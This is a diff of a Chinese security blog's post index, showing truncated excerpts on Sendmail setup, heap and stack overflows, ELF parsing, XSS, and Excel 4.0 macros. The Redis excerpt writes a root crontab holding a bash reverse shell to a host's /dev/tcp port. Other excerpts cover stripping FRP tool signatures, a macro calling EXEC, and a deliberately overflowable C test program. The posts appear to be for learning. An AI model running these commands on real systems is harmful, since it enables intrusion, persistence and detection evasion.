 sudo systemctl stop postfixsudo apt remove postfix &amp;&amp; apt purge postfix
-安装Sendmailsudo apt install sendmail
-配置Sendmail服务器sudo sendmailconfig
-接收输入电子邮件编辑/etc/mail/sendmail.mc
-DAEMON_OPTIONS(`Family=inet,  Name=MTA-v4, Port=smtp, Addr=127.0.0.1&#x27;)dnlDAEMON_OPTIONS(`Family=inet,  Name=MSP-v4, Port=submission, M=Ea, Addr=127.0.0.1&#x27;)dnl#找到上面这 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/07/12/RedisWritesShell/" title="Redis写SHELL"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/129.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Redis写SHELL"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/07/12/RedisWritesShell/" title="Redis写SHELL">Redis写SHELL</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-07-12T15:07:46.000Z" title="发表于 2021-07-12 23:07:46">2021-07-12</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Redis/">Redis</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/SHELL/">SHELL</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+安装Sendmail
+sudo apt install sendmail
+配置Sendmail服务器
+sudo sendmailconfig
+接收输入电子邮件
+编辑/etc/mail/sendmail.mc
+DAEMON_OPTIONS(`Family=inet,  Name=MTA-v4, Port=smtp, Addr=127.0.0.1&#x27;)dnlDAEMON_OPTIONS(`Family=inet,  Name=MSP-v4, Port=submission, M=Ea, Addr=127.0.0.1&#x27;)dnl# ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/07/12/RedisWritesShell/" title="Redis写SHELL"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/129.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Redis写SHELL"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/07/12/RedisWritesShell/" title="Redis写SHELL">Redis写SHELL</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-07-12T15:07:46.000Z" title="发表于 2021-07-12 23:07:46">2021-07-12</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Redis/">Redis</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/SHELL/">SHELL</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
-通过计划任务获取SHELL首先进行连接
+通过计划任务获取SHELL
+首先进行连接
 redis-cli -h 192.168.251.17 -p 6379
 然后设置文件夹路径
 config set dir /var/spool/cron/crontabs
@@ -756,15 +828,18 @@ config set dir /var/spool/cron/crontabs
 接着修改文件，Ubuntu的计划任务是在这个文件中
 config set dbfilename root
 设置计划任务，需要添加\n符号，因为写进去后会有很多无用数据
-set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.251.16/8899 0&gt ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/07/09/FrequentToolCharacteristics/" title="常见工具特征去除"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/128.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="常见工具特征去除"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/07/09/FrequentToolCharacteristics/" title="常见工具特征去除">常见工具特征去除</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-07-09T15:07:46.000Z" title="发表于 2021-07-09 23:07:46">2021-07-09</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%9C%A8%E9%A9%AC/">木马</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%8E%BB%E9%99%A4%E7%89%B9%E5%BE%81/">去除特征</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.251.16/8899 0&g ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/07/09/FrequentToolCharacteristics/" title="常见工具特征去除"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/128.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="常见工具特征去除"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/07/09/FrequentToolCharacteristics/" title="常见工具特征去除">常见工具特征去除</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-07-09T15:07:46.000Z" title="发表于 2021-07-09 23:07:46">2021-07-09</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%9C%A8%E9%A9%AC/">木马</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%8E%BB%E9%99%A4%E7%89%B9%E5%BE%81/">去除特征</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 FRP改造
+
 改造之前
+
 
 在受害者机器上使用frpc.exe -c frpc_socker.ini连接服务起的时候，会产生一个这种数据校检
 
 流量改造
+
 pkg\msg\msg.go
 这几个函数中保存着上面的信息
 
@@ -778,14 +853,16 @@ pkg\msg\msg.go
 
 
 编译方式
+
 首先执行make会进行一些GitHub的包下载（最好使用代理
 接着执行make -f Makefile.cross-compiles进行编译
 
 
 配置文件改造
+
 全称只需要修改这个文件cmd/frpc/sub/root.go
 先修改var位置，添加ip、port、fileContent这三个参数
-var (	cfgFile     string	showVersion bool	serverAddr        string	user             ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/" title="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/126.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/" title="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析">蔓灵花APT组织针对巴基斯坦定向攻击的样本分析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-18T15:45:42.000Z" title="发表于 2021-05-18 23:45:42">2021-05-18</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/">样本分析</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/APT/">APT</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+var (	cfgFile     string	showVersion bool	serverAddr        string	user        ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/" title="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/126.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/" title="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析">蔓灵花APT组织针对巴基斯坦定向攻击的样本分析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-18T15:45:42.000Z" title="发表于 2021-05-18 23:45:42">2021-05-18</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/">样本分析</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/APT/">APT</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前言
@@ -794,7 +871,6 @@ var (	cfgFile     string	showVersion bool	serverAddr        string	user         
 
 
 样本
-
 
 
 
@@ -826,7 +902,7 @@ SHA256
 
 
 PDB
-c:\Users\Asterix\Documents\Visual Studio 2008\Projects ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/05/04/HeapOverflow_Linux_0x01/" title="Linux堆溢出总结（0x01）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/123.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux堆溢出总结（0x01）"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/05/04/HeapOverflow_Linux_0x01/" title="Linux堆溢出总结（0x01）">Linux堆溢出总结（0x01）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-04T15:45:42.000Z" title="发表于 2021-05-04 23:45:42">2021-05-04</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%A0%86/">堆</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+c:\Users\Asterix\Documents\Visual Studio 2008\Projects\ ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/05/04/HeapOverflow_Linux_0x01/" title="Linux堆溢出总结（0x01）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/123.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux堆溢出总结（0x01）"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/05/04/HeapOverflow_Linux_0x01/" title="Linux堆溢出总结（0x01）">Linux堆溢出总结（0x01）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-04T15:45:42.000Z" title="发表于 2021-05-04 23:45:42">2021-05-04</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%A0%86/">堆</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前言
@@ -837,14 +913,16 @@ HVV结束，终于能闲下来学习了，开新坑啦~好耶~
 记个小知识点
 
 
+
 libc是Linux下的ANSI C函数库。
+
 
 glibc是Linux下的GUN C函数库。
 
 
 Linux下原来的标准c库Linux libc逐渐不再被维护。Linux下面的标准c库不仅有这一个，如uclibc、klibc，以及上面被提到的Linux libc，但是glibc无疑是用得最多的。glibc在/lib目录下的.so文件为libc.so.6。
-堆内存管理机制介绍不同平台的堆内存管理机制不相同，下面是几个常见平台的堆内存管理机制：
-
+堆内存管理机制介绍
+不同平台的堆内存管理机制不相同，下面是几个常见平台的堆内存管理机制：
 
 
 
@@ -875,8 +953,7 @@ libumem
 
 
 
-
-在 Linux 的 gl ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/03/26/StackOverflow_Linux_0x03/" title="Linux栈溢出总结（0x03）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/122.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux栈溢出总结（0x03）"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/03/26/StackOverflow_Linux_0x03/" title="Linux栈溢出总结（0x03）">Linux栈溢出总结（0x03）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-26T10:45:42.000Z" title="发表于 2021-03-26 18:45:42">2021-03-26</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.827Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+在 Linux 的 g ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/03/26/StackOverflow_Linux_0x03/" title="Linux栈溢出总结（0x03）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/122.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux栈溢出总结（0x03）"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/03/26/StackOverflow_Linux_0x03/" title="Linux栈溢出总结（0x03）">Linux栈溢出总结（0x03）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-26T10:45:42.000Z" title="发表于 2021-03-26 18:45:42">2021-03-26</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.827Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前言
@@ -893,24 +970,28 @@ SSP题目中，为什么当可执行文件足够小的时候，他的不同区�
 
 
 绕过PIE保护
+
 测试代码（题目泄露地址）
-//test.c#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;void vuln_func() &#123;	char buf[128];	read(STDIN_FILENO, buf, 256);&#125;int main(int argc, char *argv[]) &#123;	printf(&quot;%p\n&quot;,&amp;main);	vuln_func();	write(STDOUT_FILENO, &quot;Hello world!\n&quo ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/01/27/OfficeExcelMacro/" title="Office Excel Macro"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/121.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Office Excel Macro"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/01/27/OfficeExcelMacro/" title="Office Excel Macro">Office Excel Macro</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-27T10:45:42.000Z" title="发表于 2021-01-27 18:45:42">2021-01-27</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.632Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/">邮件钓鱼</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/Excel%E5%AE%8F/">Excel宏</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+//test.c#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;void vuln_func() &#123;	char buf[128];	read(STDIN_FILENO, buf, 256);&#125;int main(int argc, char *argv[]) &#123;	printf(&quot;%p\n&quot;,&amp;main);	vuln_func();	write(STDOUT_FILENO, &quot;Hello world!\n&qu ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/01/27/OfficeExcelMacro/" title="Office Excel Macro"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/121.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Office Excel Macro"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/01/27/OfficeExcelMacro/" title="Office Excel Macro">Office Excel Macro</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-27T10:45:42.000Z" title="发表于 2021-01-27 18:45:42">2021-01-27</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.632Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/">邮件钓鱼</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/Excel%E5%AE%8F/">Excel宏</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前言
 
 好久没笼统的学习了，梳理下Excel宏相关的东西以防下次要用的时候都不会。
 
-关于宏据我所知微软office所支持的宏里面，目前有两种
+关于宏
+据我所知微软office所支持的宏里面，目前有两种
 
 1992年：微软在office中引用了名为Excel4.0的宏代码技术，也被成为XLM宏。Excel4.0宏代码写在表格中，宏代码的具体文件呈现为xml而不是二进制文件。
 1993年：微软更新了Excel5.0技术，也就是现在常见的VBA宏代码。
 
 从Excel2010到Excel2019全线产品都支持Excel4.0宏。同时微软也提到，虽然目前Microsoft Excel仍然支持Excel4.0宏，但还是建议用户使用VBA宏。
-Macro 4.0简单利用在箭头位置点击右键-&gt;插入即可使用
+Macro 4.0
+简单利用
+在箭头位置点击右键-&gt;插入即可使用
 
 接着会出现一个新建的宏表格，我们在表格中添加如下命令，即可完成一个简单的宏
-=EXEC(&quot;calc.exe&quot;)=ALERT(&quot;hello ascotbe~& ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/01/08/CrossSiteScripting/" title="从零开始编写XSS平台"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/120.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="从零开始编写XSS平台"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/01/08/CrossSiteScripting/" title="从零开始编写XSS平台">从零开始编写XSS平台</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-08T10:45:42.000Z" title="发表于 2021-01-08 18:45:42">2021-01-08</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.847Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/XSS/">XSS</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+=EXEC(&quot;calc.exe&quot;)=ALERT(&quot;hello ascotb ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/01/08/CrossSiteScripting/" title="从零开始编写XSS平台"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/120.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="从零开始编写XSS平台"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/01/08/CrossSiteScripting/" title="从零开始编写XSS平台">从零开始编写XSS平台</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-08T10:45:42.000Z" title="发表于 2021-01-08 18:45:42">2021-01-08</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.847Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/XSS/">XSS</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前言
@@ -920,14 +1001,17 @@ Macro 4.0简单利用在箭头位置点击右键-&gt;插入即可使用
 项目地址：https://github.com/Ascotbe/Medusa
 
 
-什么是XSS跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。
-Cross-site scripting的英文首字母缩写本应为CSS，但因为CSS在网页设计领域已经被广泛指层叠样式表（Cascading St ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/12/06/ExecutableLinkableFormat/" title="Linux ELF格式解析"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/119.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux ELF格式解析"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/12/06/ExecutableLinkableFormat/" title="Linux ELF格式解析">Linux ELF格式解析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-12-06T15:45:42.000Z" title="发表于 2020-12-06 23:45:42">2020-12-06</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.827Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/ELF/">ELF</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+什么是XSS
+跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。
+Cross-site scripting的英文首字母缩写本应为CSS，但因为CSS在网页设计领域已经被广泛指层叠样式表（Cascading S ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/12/06/ExecutableLinkableFormat/" title="Linux ELF格式解析"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/119.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux ELF格式解析"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/12/06/ExecutableLinkableFormat/" title="Linux ELF格式解析">Linux ELF格式解析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-12-06T15:45:42.000Z" title="发表于 2020-12-06 23:45:42">2020-12-06</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.827Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/ELF/">ELF</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前言
+
 在写PE结构解析的时候，以为ELF结构没必要去看文件结构，直到后面做了PWN题发现不是这样的，所有还是学习下ELF结构，然后再写个解析器
 
 常见结构区分
+
 目前，PC平台流行的可执行文件格式（Executable）主要包含如下两种，它们都是COFF（Common File Format）格式的变种
 
 Windows下的PE（Portable Executable）
@@ -936,7 +1020,7 @@ Linux下的ELF（Executable Linkable Format）
 源代码经过编译后但未进行连接的那些中间文件（Windows的.obj和Linux的.o），它与可执行文件的格式非常相似，所以一般跟可执行文件格式一起采用同一种格式存储。
 其中动态链接库（DDL，Dynamic Linking Library）和静态链接库（Static Linking Library）的格式都和当前系统对应的可执行文件结构一样
 
